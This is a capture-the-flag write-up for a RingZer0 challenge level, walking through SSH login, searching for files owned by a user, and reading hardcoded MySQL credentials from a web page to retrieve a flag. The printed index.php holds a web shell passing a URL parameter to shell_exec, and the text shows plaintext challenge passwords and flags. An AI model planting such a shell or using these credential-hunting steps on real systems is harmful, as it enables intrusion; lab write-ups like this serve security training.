# **Level 3**

![](https://i.imgur.com/2HFJFVD.png)

Well, Level seq still broken, lol.

```shell
sshpass -p 'FLAG-xAqW2yJg7xPDBWueTgjwNc1nVY' ssh architect@challenges.ringzer0team.com -p 10152
```

Let's find file from root which is readable and used by `architect`.

```shell
find / -readable -and -user architect 2>/dev/null | head -n 10
/var/www/index.php
/home/architect
/home/architect/.mysql_history
/home/architect/.bashrc
/home/architect/.bash_logout
```

Let's see a web page and a history of mysql using by architect.

I think something like `connect.php` or `PDO.php` will be more suspicious to store `username/password` for mysql database, however, there's nothing named like that.

Let's check `/var/www/index.php`.

```php
cat /var/www/index.php
<?php
if(isset($_GET['cmd'])) {
  $res = shell_exec(urldecode($_GET['cmd']));
  print_r(str_replace("\n", '<br />', $res));
  exit();
}
$info = (object)array();
$info->username = "arch";
$info->password = "asdftgTst5sdf6309sdsdff9lsdftz";
$id = 1003;

function GetList($id, $info) {
        $id = 2;
        $link = mysql_connect("127.0.0.1", $info->username, $info->password);
        mysql_select_db("arch", $link);
        $result = mysql_query("SELECT * FROM arch");
        $output = array();
        while($row = mysql_fetch_assoc($result)) {
                array_push($output, $row);
        }
        var_dump($output);
        return $output;
}
......?>
```

Luckly, we got what we want here.

Let's get into the database.

```shell
mysql -h localhost -u arch -p
Enter password: asdftgTst5sdf6309sdsdff9lsdftz
```

```mysql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| arch               |
+--------------------+
2 rows in set (0.00 sec)

mysql> use arch;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

mysql> show tables;
+----------------+
| Tables_in_arch |
+----------------+
| arch           |
| flag           |
+----------------+
2 rows in set (0.00 sec)

mysql> select * from flag;
+---------------------------------+
| flag                            |
+---------------------------------+
| FLAG-0I68UrLA758G5G30806w637a4k |
+---------------------------------+
1 row in set (0.00 sec)
```

![](https://i.imgur.com/n2HPAiI.png)
